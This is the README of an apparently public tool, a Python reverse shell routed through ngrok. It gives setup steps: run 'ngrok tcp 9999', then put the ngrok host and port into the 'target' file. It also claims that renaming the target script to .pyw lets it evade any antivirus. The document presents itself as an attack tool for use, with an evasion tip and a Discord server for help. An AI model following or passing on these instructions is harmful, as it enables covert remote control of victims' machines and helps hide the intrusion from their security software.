# PythonReverseShellwithNgrok
 This is a python reverse shell with ngrok
 To use it you have to download [Ngrok](https://www.ngrok.com) and create your account.

 The python file uses socket so you wont need any librarys.

 After you downloaded ngrok just add your auth key and than run this command:
 `ngrok tcp 9999`

 You can change the port in the python file, but if you change it you have to write it also in the ngrok command like this:
 `ngrok tcp *your port*`

 After you started ngrok with the command there will be a part with tcp://0.tcp.ngrok.io:12345.

 Edit the target file and put the 0.tcp.ngrok.io under the server host and the port 12345 under the server port section.


If you want it to run completely undetected for any antivirus just change the name of the target file from `target.py` to `target.pyw` (Just add a w on the .py thingy)


 If you need any help with this just join my [discord server](https://discord.gg/WrKjFQ5a5C).

